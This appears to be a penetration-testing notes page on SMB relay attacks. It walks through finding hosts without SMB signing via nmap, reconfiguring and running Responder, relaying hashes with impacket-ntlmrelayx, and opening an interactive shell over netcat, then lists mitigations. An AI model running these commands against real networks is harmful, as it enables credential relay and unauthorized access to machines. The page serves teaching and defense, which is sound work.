# SMB Relay

Instead of cracking hashes gathered with Responder, we can instead relay those hashes to specific machines and potentially gain access.

<figure><img src="../../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

#### Requirements:

* SMB signing **must be disabled** or **not enforced** on the target
* Relay user credentials must be admin on machine for any real value.



#### Methodology:

* Identify Hosts without SMB signing
* Change `Responder` configuration before run it.
* Run `Responder` tool on the right network interface
* Set up our SMB relay



## Identify Hosts without SMB signing

```bash
nmap --script=smb2-security-mode.nse -p445 IP/24
```

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



## Change Responder conf

The settings SMB and HTTP must be off. This because we have to relay the hashes and not capture them. This port will be use by SMB relay.

```bash
sudo nano /etc/responder/Responder.conf
```

<figure><img src="../../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Run Responder tool

```bash
sudo responder -I NETWORK_INTERFACE -dw -v
```

<figure><img src="../../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>



## Set up SMB relay

To set up SMB relay we will using `impacket-ntlmrelayx` tool.

```bash
sudo impacket-ntlmrelayx -tf targets.txt -smb2support
```

{% hint style="info" %}
The `targets.txt` file contains all computers identify in the step 1
{% endhint %}

{% code title="targets.txt" lineNumbers="true" %}
```
192.168.X.X
192.168.X.X
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

### New connection auto-shell

We can set the `ntlmrelayx` to enstablish a shell when the relay can enters into a pc.

```bash
sudo impacket-ntlmrelayx -tf targets.txt -smb2support -i
```

Check the port in the output where the connection has been established,

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Use netcat to establish the connection.

```bash
nc 127.0.0.1 PORT
```



## Mitigation strategies:

* **Enable SMB Signing on all devices**
  * Pro: Completely stops the attack
  * Con: Con cause performance issues with file copies
* **Disable NTLM authentication on network**
  * Pro: Completely stops the attack&#x20;
  * Con: If kerberos stops working, Windows defaults back to NTLM
* **Account tiering**
  * Pro: Limits domain admins to specific tasks
  * Con: Enforcing the policy may be difficult
* **Local admin restrinction**
  * Pro: Can prevent a lot of lateral movement
  * Con: Potential increase in the amount of service desk tickets
